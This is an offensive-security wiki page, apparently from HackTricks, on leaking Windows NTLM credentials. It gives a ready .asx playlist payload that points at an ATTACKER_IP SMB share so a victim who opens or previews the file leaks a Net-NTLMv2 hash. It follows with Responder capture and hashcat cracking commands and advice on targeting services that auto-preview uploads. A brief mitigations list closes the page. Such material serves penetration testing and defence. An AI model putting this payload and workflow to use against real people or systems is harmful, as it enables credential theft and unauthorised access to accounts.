# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Check all the great ideas from [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) from the download of a microsoft word file online to the ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md and [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

---

## Windows Media Player playlists (.ASX/.WAX)

If you can get a target to open or preview a Windows Media Player playlist you control, you can leak Net‑NTLMv2 by pointing the entry to a UNC path. WMP will attempt to fetch the referenced media over SMB and will authenticate implicitly.

Example payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Collection and cracking flow:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

Notes
- Works with .asx and .wax. Generate files with ntlm_theft for convenience.
- Effective when apps/services automatically open uploads for preview (e.g., HR reviewing candidate videos).
- Mitigations: Disable NTLM/SMB egress, don’t auto-open untrusted media, and harden WMP associations.

## References
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [ntlm_theft – NTLM coercion file generator](https://github.com/Greenwolf/ntlm_theft)
- [Responder](https://github.com/lgandx/Responder)

{{#include ../../banners/hacktricks-training.md}}